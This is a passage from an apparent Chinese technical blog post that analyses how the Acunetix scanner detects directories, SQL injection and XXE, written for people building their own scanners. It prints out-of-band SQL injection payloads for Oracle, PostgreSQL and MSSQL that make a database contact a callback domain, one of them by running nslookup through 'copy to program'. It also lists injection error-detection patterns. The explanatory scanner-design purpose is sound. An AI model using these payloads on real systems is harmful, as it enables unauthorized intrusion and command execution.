    使用方法一)一个服务器
    工具：https://github.com/Wyc0/DNSLog/blob/master/dns.py(简单，一个脚本就够了)
    触发方法：nslookup urlid-param-cveid.wils0n.cn 服务器的ip
    这种方法必须指定后面的ip。
    使用方法二）一个服务器加一个域名：
    域名设置(请教了@izy和@凤凰)
    用阿里云的为例子：
    1.设置一个a记录。ns1.wils0n.cn --->你的服务ip假如 118.11.11.11
    2.设置一个ns记录。 dns.wils0n.cn --->ns1.wils0n.cn
存在的问题：
问题1）没有响应包回复，导致请求会一直发，可以参考
进行改进一下。
问题2)
url跳转扫描可能会导致误报的情况出现，由于dns请求会绕过很多跳，所以根据扫描ip来判断是无法做到，暂时不知道怎么解决。。。不过误报会比漏报好一些
### 4.awvs的网站目录和文件扫描思路
很多web扫描器的开始都是对url进行网站目录和文件扫描，然后再结合爬虫一起爬一下。  
因为大家的想法都是：“不管有没有漏洞，我先扫一遍目录再说”，所以网上这种爬目录文件的工具极其多。  
看了一下网上的工具的逻辑大概是:
    1.取一个不可能存在的url，判断是不是存在404的状态码。
      存在的404话，下面的判断只要根据状态码来判断是否存在就好了。
      不存在的话走下面2的逻辑。
    2.获取该不存在url的相应内容，作为一个404不存在的页面标示，接下去的扫描如果获取到页面不和这个404表示一样的就认为是200的存在页面。
这个思路在大部分情况下面用。但是有些站点，你会发现扫到一堆200的误报。分析为什么：
    在逻辑1中，404的判断取一个不存在的url是不够的，你需要取多个，因为有的站点xxxx.php是404，而xxxx.jsp就变成200了。
      在逻辑2中，有种情况是这个404的页面是会不断变化的，比如淘宝的404页面中，下面会出现不同的链接商品推荐。这样就会产生一大堆的误报。
那么我们分析一下awvs的目录和文件扫描姿势:（Backup_File.script，Sensitive_Files.script,
Possible_Sensitive_Directories ,Possible_Sensitive_Files ）
    第一）在Backup_File和Sensitive_Files中看到能用正则匹配的，先用规则来匹配，这个比较准确，误报低。
    第二) Backup_File中我们发现，awvs的再解决逻辑2中出现的问题时候，用了一个小的tip:在发现页面内容和404标示不一样的时候，再去取了一个不存在的url2获取新的404标示，然后判断两个标示是不是一样，一样的话说明这个200扫描没用问题，从而去掉这个误报。
    第三) 在Possible_Sensitive_Directories ,Possible_Sensitive_Files中，我们发现awvs去掉了逻辑2。只对存在404的url进行目录和文件扫描。而目录扫描和文件扫描的逻辑不一样的，我们发现当一个文件存在时候返回时200，但是当一个目录存在的时候确是302跳转，我们需要匹配http头的Location进行判断。那么网上那些扫描目录工具不就2b了么？
    这里其实要说到一个坑，这些工具都是使用了python的requests库，这个库默认是会进行url跟随跳转的。所以他们没有必要区分扫描目录和文件扫描。如果你把requests中设置了allow_redirects=False，那你就要去自己匹配http头的Location关键字。
个人感觉扫目录逻辑走第一和第三就可以了。
### 5.sql注入检查
可能很多人都会用sqlmap来做注入检查，但是sqlmap还是有点大，扫描payload比较多，扫描时间长。  
awvs的sql注入也可以参考一下:
#### 1.基于错误返回信息的关键字直接判断为存在sql注入漏洞。(Sql_Injection.script)
主要匹配的关键字有:
    You have an error in your SQL syntax|The database has encountered a problem|database error|unknown column\\s|SQL syntax.*MySQL|Warning.*mysql_.*|(Incorrect\ssyntax\snear\s'[^']*')|.....(很多大家去对应脚本里面找)
这样匹配的话，还是比较准确的，但是有的时候会有误报。
#### 2.盲注入(Blind_Sql_Injection.script)
2.1 bool型的盲注入  
我把这部分的扫描逻辑理了一下，大概是这样的：
    1.判断参数是不是有效的，即：输入和原来的值不一样的参数时候，页面(过滤过的，过滤了html标签，当前输入值，原始输入值)是否一样
    2.如果参数有效，就用 and payload 判断是不是存在漏洞(多个判断)
    3.如果参数无效，就用 or payload 判断是不是存在漏洞(多个判断)
    我参考以后，发现它会有一些漏扫描，比如 数字型等带有单引号的注入。
    然后我决定优化一下，并去掉第三步的验证。因为一般都无有效参数的，无效的参数一般不做检查了，而且or注入可能会导致一些误报等。
2.2.基于时间盲注入  
原理很简单，然后数据库去sleep一段时间。payload对应脚本里面找，或者可以参考一下sqlmap的。
然后就是注意各种闭合，比如: ', ", ), )), '), "), ')), ")), ;, 等等
个人的实践告诉我，基于时间的注入检查是最准确的。如果你是甲方的话，基于时间盲注入应该是最适合你的了。因为你可以去监控mysql的慢日志或者异常日志去查询sleep登关键字来结合着一起发现sql注入漏洞，我在实践中是有用这种方法发现过一些比较隐蔽的sql注入的。
#### 3.结合AcuMonitor盲打
测试oracle的注入:
    xxxx||UTL_INADDR.get_host_address('{DOMAIN}')
PostgreSQL:
    {ORIGVALUE};copy (select '') to program 'nslookup {DOMAIN}
windows +mssql:
    {ORIGVALUE};EXEC master..xp_dirtree '\\{DOMAIN}\' --
同样，也要注意各种闭合。
### 6.xxe 优化
xxe漏洞检测，改变Content-type头（text/xml，application/xml），可能会测出漏洞。
### 更多脚本还在分析
.......
## 四）结尾
很多挺好玩的漏洞扫描知识，因为文章篇幅和时间精力问题就没有进行更多分析了，大家可以自己去找自己感觉好用的script进行debug和逻辑分析。分析到好的思路也可以分享出来看看。
**请勿用本文提到的技术进行未授权的渗透测试,我们不负任何连带法律责任**
文章参考:  